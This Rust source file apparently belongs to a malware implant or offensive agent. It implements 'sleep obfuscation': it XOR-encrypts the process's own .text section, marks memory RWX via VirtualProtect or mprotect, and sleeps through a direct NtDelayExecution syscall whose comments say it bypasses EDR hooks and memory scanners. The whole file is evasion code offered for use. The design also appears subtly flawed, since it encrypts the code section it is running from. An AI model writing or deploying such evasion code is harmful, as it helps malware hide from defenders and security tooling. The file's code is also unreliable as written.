//! Sleep Obfuscation: encrypts .text section in memory before sleeping,
//! uses direct syscall for NtDelayExecution, then decrypts on wake.
//!
//! This defeats memory scanners and EDR hooks on kernel32!Sleep.
//!
//! Flow:
//!   1. Find our own .text section (base + size)
//!   2. Generate random XOR key
//!   3. XOR-encrypt .text in memory
//!   4. Direct syscall: NtDelayExecution(alertable, &timeout)
//!   5. XOR-decrypt .text (same key)
//!
//! The encryption key is kept on the stack (not in .text), so it survives.

use std::time::Duration;

/// Sleep with .text section obfuscation.
/// Falls back to plain sleep if any step fails.
pub fn obfuscated_sleep(duration: Duration) {
    #[cfg(target_os = "windows")]
    {
        if let Err(_) = obfuscated_sleep_windows(duration) {
            // Fallback: direct syscall sleep without encryption
            direct_syscall_sleep(duration);
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Linux: use nanosleep directly, encrypt with mprotect trick
        let _ = obfuscated_sleep_linux(duration);
    }
}

/// Get the base address and size of the current module's .text section.
#[cfg(target_os = "windows")]
unsafe fn get_text_section() -> Option<(*mut u8, usize)> {
    // Read image base from PEB
    let peb: *const u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    if peb.is_null() {
        return None;
    }
    // PEB->ImageBaseAddress at offset 0x10
    let image_base = *(peb.add(0x10) as *const *mut u8);
    if image_base.is_null() {
        return None;
    }

    // Parse DOS header
    let e_lfanew = *(image_base.add(0x3C) as *const i32) as usize;
    let nt = image_base.add(e_lfanew);

    // NumberOfSections at NT+0x06
    let num_sections = *(nt.add(0x06) as *const u16);
    // SizeOfOptionalHeader at NT+0x14
    let size_opt = *(nt.add(0x14) as *const u16);
    // Section headers start at NT + 0x18 + SizeOfOptionalHeader
    let sections_start = nt.add(0x18 + size_opt as usize);

    for i in 0..num_sections as usize {
        let sec = sections_start.add(i * 40); // each section header is 40 bytes
        // First 8 bytes = name (null-padded)
        let name_bytes = std::slice::from_raw_parts(sec, 8);
        if name_bytes.starts_with(b".text\0\0\0") {
            // VirtualSize at offset 8, VirtualAddress at offset 12
            let virtual_size = *(sec.add(8) as *const u32) as usize;
            let virtual_addr = *(sec.add(12) as *const u32) as usize;
            let text_base = image_base.add(virtual_addr);
            return Some((text_base, virtual_size));
        }
    }
    None
}

/// XOR-encrypt/decrypt a region in place.
#[inline]
unsafe fn xor_crypt(data: *mut u8, len: usize, key: &[u8]) {
    let key_len = key.len();
    for i in 0..len {
        *data.add(i) ^= key[i % key_len];
    }
}

/// Generate a random 64-byte XOR key on the stack.
fn generate_key() -> [u8; 64] {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    use std::time::Instant;

    let mut key = [0u8; 64];
    // Mix timing entropy + thread id + address entropy
    let mut hasher = DefaultHasher::new();
    Instant::now().hash(&mut hasher);
    std::thread::current().id().hash(&mut hasher);
    let seed = hasher.finish().to_le_bytes();

    for i in 0..64 {
        // Simple PRNG seeded from timing
        key[i] = seed[i % 8].wrapping_add(i as u8).wrapping_mul(0x9E) ^ 0x37;
    }
    key
}

#[cfg(target_os = "windows")]
fn obfuscated_sleep_windows(duration: Duration) -> Result<(), ()> {
    unsafe {
        let (text_base, text_size) = get_text_section().ok_or(())?;
        let key = generate_key();

        // Change .text to RWX for encryption
        let mut old_protect: u32 = 0;
        virtual_protect(text_base, text_size, PAGE_EXECUTE_READWRITE, &mut old_protect)?;

        // Encrypt .text
        xor_crypt(text_base, text_size, &key);

        // Restore protection to RX (still encrypted, but not writable)
        virtual_protect(text_base, text_size, PAGE_EXECUTE_READ, &mut old_protect)?;

        // Direct syscall sleep — bypasses any EDR hooks on kernel32!Sleep / ntdll!NtDelayExecution
        direct_syscall_sleep(duration);

        // Back to RWX for decryption
        virtual_protect(text_base, text_size, PAGE_EXECUTE_READWRITE, &mut old_protect)?;

        // Decrypt .text
        xor_crypt(text_base, text_size, &key);

        // Restore original protection
        virtual_protect(text_base, text_size, old_protect, &mut old_protect)?;

        Ok(())
    }
}

/// Direct syscall for NtDelayExecution — resolves syscall number dynamically
/// to avoid hardcoded syscall numbers that differ across Windows versions.
#[cfg(target_os = "windows")]
fn direct_syscall_sleep(duration: Duration) {
    unsafe {
        // Resolve NtDelayExecution from ntdll
        extern "system" {
            fn LoadLibraryA(lpFileName: *const u8) -> *mut u8;
            fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
        }

        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll.is_null() {
            // Absolute fallback
            std::thread::sleep(duration);
            return;
        }

        let nt_delay_addr = GetProcAddress(ntdll, b"NtDelayExecution\0".as_ptr());
        if nt_delay_addr.is_null() {
            std::thread::sleep(duration);
            return;
        }

        // Parse the syscall number from the stub:
        // ntdll!NtDelayExecution:
        //   mov r10, rcx       (4C 8B D1)
        //   mov eax, <SSN>     (B8 XX XX 00 00)
        //   syscall             (0F 05)
        //   ret
        let stub = std::slice::from_raw_parts(nt_delay_addr, 8);
        if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
            let ssn = u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]);

            // LARGE_INTEGER: negative = relative delay in 100ns units
            let hundred_ns = (duration.as_nanos() / 100) as i64;
            let large_int: i64 = -(hundred_ns as i64);

            // Direct syscall
            let mut status: i64;
            std::arch::asm!(
                "mov r10, rcx",
                "syscall",
                in("rax") ssn as u64,
                in("rcx") 0usize, // Alertable = FALSE
                in("rdx") &large_int as *const i64,
                lateout("rax") status,
                out("r10") _,
                out("r11") _,
            );
            let _ = status;
        } else {
            // Couldn't parse stub, call normally
            let _ = nt_delay_addr;
            std::thread::sleep(duration);
        }
    }
}

/// Linux: mmap/mprotect-based sleep obfuscation
#[cfg(target_os = "linux")]
fn obfuscated_sleep_linux(duration: Duration) -> Result<(), ()> {
    unsafe {
        // Find .text from /proc/self/maps
        let maps = std::fs::read_to_string("/proc/self/maps").map_err(|_| ())?;
        let exe_path = std::fs::read_link("/proc/self/exe").map_err(|_| ())?;
        let exe_str = exe_path.to_string_lossy();

        let mut text_start: usize = 0;
        let mut text_end: usize = 0;
        for line in maps.lines() {
            if line.contains(&*exe_str) && line.contains("r-xp") {
                let parts: Vec<&str> = line.split_whitespace().collect();
                let addr_range: Vec<&str> = parts[0].split('-').collect();
                text_start = usize::from_str_radix(addr_range[0], 16).map_err(|_| ())?;
                text_end = usize::from_str_radix(addr_range[1], 16).map_err(|_| ())?;
                break;
            }
        }
        if text_start == 0 {
            return Err(());
        }

        let text_base = text_start as *mut u8;
        let text_size = text_end - text_start;
        let key = generate_key();

        // mprotect to RWX for encryption
        libc::mprotect(text_base as *mut std::ffi::c_void, text_size, libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC);

        // Encrypt
        xor_crypt(text_base, text_size, &key);

        // Restore to RX
        libc::mprotect(text_base as *mut std::ffi::c_void, text_size, libc::PROT_READ | libc::PROT_EXEC);

        // Sleep via nanosleep
        let ts = libc::timespec {
            tv_sec: duration.as_secs() as i64,
            tv_nsec: duration.subsec_nanos() as i64,
        };
        libc::nanosleep(&ts, std::ptr::null_mut());

        // RWX for decryption
        libc::mprotect(text_base as *mut std::ffi::c_void, text_size, libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC);

        // Decrypt
        xor_crypt(text_base, text_size, &key);

        // Restore RX
        libc::mprotect(text_base as *mut std::ffi::c_void, text_size, libc::PROT_READ | libc::PROT_EXEC);

        Ok(())
    }
}

// ── Windows helpers ──────────────────────────────────────────────────

#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READ: u32 = 0x20;

#[cfg(target_os = "windows")]
unsafe fn virtual_protect(addr: *mut u8, size: usize, new_protect: u32, old_protect: *mut u32) -> Result<(), ()> {
    extern "system" {
        fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32, lpflOldProtect: *mut u32) -> i32;
    }
    if VirtualProtect(addr, size, new_protect, old_protect) != 0 {
        Ok(())
    } else {
        Err(())
    }
}
